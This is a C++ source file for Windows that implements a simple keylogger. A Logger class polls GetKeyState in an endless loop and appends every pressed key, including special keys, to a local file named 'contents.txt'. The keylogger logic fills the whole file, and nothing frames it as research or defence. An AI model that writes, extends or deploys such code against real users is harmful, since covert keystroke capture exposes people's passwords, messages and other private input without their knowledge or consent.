#include "Logger.h"
#include "Windows.h"
#include <fstream>
#include <iostream>

Logger::Logger(){
    // open file to write to 
    this->contents.open("contents.txt",std::ios::app);
}

Logger::~Logger(){
    // close the output file
    this->contents.close();
}
void Logger::listen(){
    /*
    Indefinately listen to see if a character is pressed.
    if a character is pressed then it should record the character
    */
   int spaceCount = 0;
   while (true){
       for (char key: this->normalKeys){
           if (GetKeyState(key) & 0x8000){
               this->contents << key;
               Sleep(50);
           }
       }
       for (WORD key: this->specialKeys){
           if (GetKeyState(key) & 0x8000){
               auto value = (this->specialMapping).find(key);
               this->contents << value->second;
               if (key == VK_SPACE){
                   spaceCount++;
                   if (spaceCount == 30){
                       spaceCount = 0;
                       this->contents << std::endl;
                   }
               }
               Sleep(50);
           }
       }
   }
}

int main(){
    Logger myPiece;
    myPiece.listen();
    std::cout << 0x5B;
    return 0;
}